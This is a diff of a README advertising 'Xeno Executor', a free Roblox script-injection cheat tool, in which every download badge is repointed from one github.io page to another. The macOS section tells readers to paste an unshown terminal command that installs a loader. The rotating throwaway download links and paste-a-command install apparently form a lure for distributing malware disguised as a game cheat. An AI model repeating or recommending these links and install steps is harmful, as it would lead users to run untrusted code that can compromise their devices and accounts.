@@ -10,8 +10,8 @@ The **👾 Xeno Executor** carries the highest UNC score in the free executor ti
 
 <div align="center">
 
-[![Download Xeno Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download Xeno Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
 
 </div>
 
@@ -113,7 +113,7 @@ The **👾 Xeno Executor** carries the highest UNC score in the free executor ti
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20XENO%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20XENO%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
 
 ### 🍎 macOS
 
@@ -121,7 +121,7 @@ The **👾 Xeno Executor** carries the highest UNC score in the free executor ti
 2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
 
 ---
 
@@ -180,5 +180,5 @@ Typically **within 24 hours**. The adaptive injection layer minimizes the update
 
 Join over 2.7 million players who choose Xeno Executor for the highest UNC compatibility in the free executor tier — in 2026 and beyond.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20XENO%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20XENO%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
